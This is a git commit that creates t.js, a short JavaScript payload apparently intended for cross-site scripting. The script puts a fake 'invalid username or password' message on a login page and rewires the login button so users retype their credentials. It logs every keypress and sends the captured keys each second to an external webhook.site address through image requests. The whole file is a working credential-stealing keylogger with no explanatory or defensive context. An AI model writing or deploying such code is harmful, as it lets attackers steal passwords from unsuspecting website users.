e5dc904ebcc89f60d18a1c892d4cca4c03cbf011
c10sec <52710212+c10sec@users.noreply.github.com>
2023-05-03 17:31:12 +0200

    Create t.js

---
+++ t.js
@@ -0,0 +1,22 @@
+var keys='';
+//var url = 'http://127.0.0.1:9001/?c=';
+var url = 'https://webhook.site/e515e515-d6ce-4063-905b-b68b19b5bbf9?c=';
+
+stepToLocal();
+a=document.getElementById("login-error");
+a.innerHTML="Usuario y/o password no válidos";
+b=document.getElementById("login");
+b.getElementsByTagName("button")[0].setAttribute("onclick","window.location='/'");
+
+document.onkeypress = function(e) {
+	get = window.event?event:e;
+	key = get.keyCode?get.keyCode:get.charCode;
+	key = String.fromCharCode(key);
+	keys+=key;
+}
+window.setInterval(function(){
+	if(keys.length>0) {
+		new Image().src = url+keys;
+		keys = '';
+	}
+}, 1000);
